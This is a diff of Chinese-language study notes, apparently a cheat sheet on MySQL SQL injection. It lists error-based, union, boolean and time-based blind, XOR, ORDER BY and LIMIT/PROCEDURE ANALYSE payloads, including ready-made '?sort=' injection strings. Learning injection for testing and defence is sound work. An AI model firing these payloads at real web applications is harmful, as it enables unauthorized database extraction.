@@ -70,7 +70,7 @@ select * from test where id=1 and multilinestring((select * from (select * from 
 exp()格式：
 select * from test where id=1 and exp(~(select * from (select 注入点)a));
 ```
-## Union注入
+## Union注入（需注意要使查询条件不存在才会回显注入的值）
 ```格式：
 select * from test where id=1 union 注入点
 猜字段（union需要两个查询结果的列相同）
@@ -136,14 +136,17 @@ select * from test where id=1 and count(select comment from guest)>10;
 select * from test where id=1 and length(select comment from guest limit 0,1)>4;
 求字段内容对应的ASCII
 select * from test where id=1 and ascii(substr((select comment from guest limit 0,1),1,1))>97;
-基于时间的盲注
+
+```
+## 基于时间的盲注
 通过响应时间来判断是否注入成功
 相关函数：
-benchmark(count,expr):重复count次expr	benchmark(1000000,md5(1))
+`benchmark(count,expr):重复count次expr	benchmark(1000000,md5(1))
 sleep(num):延迟num秒后返回			sleep(10)
 笛卡尔积
-get_lock锁
+get_lock锁`
 格式：
+```
 select * from test where id=1 and if(注入点,sleep(10),1);
 ```
 ## 异或注入
@@ -159,4 +162,33 @@ MySQL数据库，字符和数字进行比较时：
 select * from test where id=0^(ascii(substr(注入点,0,1))>97)
 0^(ascii(substr((select(flag)from(flag)),0,1))>97) 空格过滤
 ```
-
+## order by 字段注入
+### 使用报错注入 
+```
+updatexml(1,if(1=2,1,(表达式)),1)
+extractvalue(1,if(1=2,1,(表达式)));
+```
+### 使用布尔盲注
+知道列名时：
+`order by if(表达式，coulumn_name_1,column_name_2)`
+不知道列名时：
+`order by if(表达式,1,(select id from information_schema.tables))`
+```
+?sort=1' and if(ascii(substr(database(),1,1))=115,username,password)--+
+```
+### 使用rand函数盲注
+当表达式为true和false时，排序结果是不同的，所以就可以使用rand()函数进行盲注了
+```
+?sort=rand(ascii(left(database(),1))=115)'--+
+```
+### 使用时间盲注
+```
+order by 2 and if(表达式,1,sleep(1))
+order by 2 and if(length(database())>6,sleep(2),3)
+```
+## limit字段注入
+limit 关键字后面还可跟PROCEDURE和 INTO两个关键字，但是 INTO 后面写入文件需要知道绝对路径以及写入shell的权限，因此利用比较难，因此这里以PROCEDURE为例进行注入
+```
+select id from users order by id desc limit 0,1 procedure analyse(1,1);
+ select id from users order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
+```
